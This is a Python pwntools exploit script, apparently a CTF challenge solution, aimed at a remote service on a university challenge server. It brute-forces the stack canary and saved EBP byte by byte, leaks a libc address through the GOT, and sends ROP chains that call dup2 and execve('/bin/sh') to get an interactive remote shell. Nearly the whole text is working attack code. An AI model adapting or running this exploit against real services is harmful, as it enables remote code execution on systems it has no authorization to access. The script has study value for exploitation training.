# Bruteforce Canary Value
from pwn import *

cookie = ELF('./cookie')

rep = 0x40
# EBP can also be bruteforced by the following code, and EBP is as vital as canary
canary_ebp = b''
for i in range(16):
    for c in range(256):
        io = remote('pwn1.0ops.sjtu.cn', 10006, level='error')
        # io = remote('127.0.0.1', 10006, level='error')
        payload = b'A' * rep + canary_ebp + bytearray([c])
        #print(len(payload))
        io.sendline(payload)
        x = io.recvall()
        if b'Bye' in x:
            print(f"canary byte {i}: {hex(c)}")
            canary_ebp += bytearray([c])
            io.close()
            break
        io.close()

# canary_ebp = b'\x00\x00o\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x34\xbf\xe2\xff' 


fd = 4
# 0x08048EEC: push fd; call child_routine
payload1 = b'A' * rep + canary_ebp + p32(cookie.plt['send']) + p32(0x08048EEC) + p32(4) + p32(cookie.got['__libc_start_main']) + p32(4) + p32(0)
io = remote('pwn1.0ops.sjtu.cn', 10006, level="error")
io.sendline(payload1)
print(io.recvline())
p = io.recv(4)
print(io.recvline())

print(p)

__libc_start_main = u32(p[-4:])
print(hex(__libc_start_main))

libc = ELF('./libc6_2.23-0ubuntu11.2_i386.so') # got libc

libc_base = __libc_start_main - libc.symbols['__libc_start_main']
# shell get input from stdin, and output to stdout which is both invisible to me. So I may need redirect input and output
# dup2(int oldfd, int newfd), duplicate from oldfd to newfd, we here use `dup2(4, 1)` and `dup2(4, 2)` to spawn a shell
dup2 = libc_base + libc.symbols['dup2'] 
bin_sh = libc_base + next(libc.search(b'/bin/sh\x00'))
execve = libc_base + libc.symbols['execve']

stdout_fd = 1
stdin_fd = 0

payload2 = b'A' * rep + canary_ebp + p32(dup2) + p32(0x08048EEC) + p32(fd) + p32(stdin_fd) + p32(0)

io.sendline(payload2)

print(io.recvline())

payload3 = b'A' * rep + canary_ebp + p32(dup2) + p32(0x08048EEC) + p32(fd) + p32(stdout_fd) + p32(0)

io.sendline(payload3)
print(io.recvline())

payload4 = b'A' * rep + canary_ebp + p32(execve) + p32(0) + p32(bin_sh) + p32(0) + p32(0)

io.sendline(payload4)
io.interactive()

io.close()